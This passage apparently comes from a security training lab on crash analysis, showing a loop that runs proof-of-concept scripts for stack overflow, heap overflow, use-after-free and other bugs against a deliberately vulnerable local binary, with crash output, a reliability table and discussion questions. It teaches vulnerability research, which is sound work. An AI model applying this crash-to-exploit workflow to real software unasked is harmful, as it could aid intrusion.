for poc in pocs/*_poc.py; do
    echo ""
    echo "Testing $(basename $poc)..."
    python3 $poc || echo "FAILED: $poc"
done
#=== Testing all PoCs ===

#Testing heap_crash_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17008
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17008)
#[+] Crash confirmed! (ASAN exit code 1)

#Testing heap_overflow_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17015
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17015)
#[+] Crash confirmed! (ASAN exit code 1)

#Testing stack_crash_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_no_protect': pid 17022
#[*] Process '/home/dev/crash_analysis_lab/vuln_no_protect' stopped with exit code -11 (SIGSEGV) (pid #17022)
#[+] Crash confirmed! (SIGSEGV)

#Testing stack_overflow_poc.py...
#[*] Testing PoC...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_no_protect': pid 17027
#[*] Process '/home/dev/crash_analysis_lab/vuln_no_protect' stopped with exit code -11 (SIGSEGV) (pid #17027)
#[+] Crash confirmed! (SIGSEGV)

#Testing uaf_poc.py...
#[*] Testing UAF (test case 3) with ASAN build...
#[+] Starting local process '/home/dev/crash_analysis_lab/vuln_asan': pid 17032
#[*] Process '/home/dev/crash_analysis_lab/vuln_asan' stopped with exit code 1 (pid 17032)
#[+] UAF detected! (exit code 1)

```

**Step 5: Test PoC Reliability**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Test stack overflow PoC reliability
python3 pocs/stack_overflow_poc.py --test

# Expected output:
# [*] Testing reliability (10 attempts)
# [+] Crash confirmed! (SIGSEGV)
# ... (10 times)
# [*] Crash rate: 10/10 (100.0%)
```

**Expected Results**:

| Vulnerability  | Test Case | PoC File                | Reliability | Notes                     |
| -------------- | --------- | ----------------------- | ----------- | ------------------------- |
| Stack Overflow | 1         | `stack_overflow_poc.py` | 100%        | Crashes with/without ASAN |
| Heap Overflow  | 2         | `heap_overflow_poc.py`  | 100% (ASAN) | **Silent without ASAN!**  |
| Use-After-Free | 3         | `uaf_poc.py`            | 100% (ASAN) | **Silent without ASAN!**  |
| Double-Free    | 4         | `double_free_poc.py`    | 100%        | Crashes with/without ASAN |
| NULL Deref     | 5         | `null_deref_poc.py`     | 100%        | Crashes with/without ASAN |

> [!WARNING] **Critical: ASAN Required for Heap Bugs**
> Heap overflow and UAF vulnerabilities do **not crash** without AddressSanitizer!
> Always test with `vuln_asan` build to detect these bug types.

**Success Criteria**:

- PoC generated for each of the 5 vulnerability types in vulnerable_suite.c
- Each PoC crashes target reliably (use ASAN build for heap overflow and UAF)
- Code is documented with vulnerability type and test case number
- Scripts can be run independently from ~/crash_analysis_lab
- Pipeline runs end-to-end without manual intervention

### Key Takeaways

1. **Reliable PoCs are essential**: Foundation for exploit development and reporting
2. **Automation enables scale**: Manual PoC creation doesn't scale past a few bugs
3. **Testing is critical**: Verify PoC reliability before sharing
4. **Documentation matters**: Clear comments make PoCs useful for others
5. **Python + pwntools is powerful**: Standard toolset for security research
6. **Panics ≠ Vulnerabilities**: Safe Rust/Go panics are DoS at worst
7. **Unsafe code is the attack surface**: Focus analysis on `unsafe` blocks and FFI boundaries
8. **Race conditions matter**: Go's race detector catches what safe code analysis misses
9. **FFI boundaries need ASAN**: Sanitize both sides of language boundaries
10. **Tooling exists**: Use rust-gdb, Delve—don't force C/C++ tools

### Discussion Questions

1. What are the ethical considerations when publishing PoC code?
2. How does PoC reliability (e.g., 10/10 crash rate) affect vulnerability severity assessment?
3. What pwntools features (p32/p64, tubes, ELF parsing) are most useful for PoC development?
4. How can automated crash→minimize→PoC pipelines be integrated into continuous fuzzing workflows?

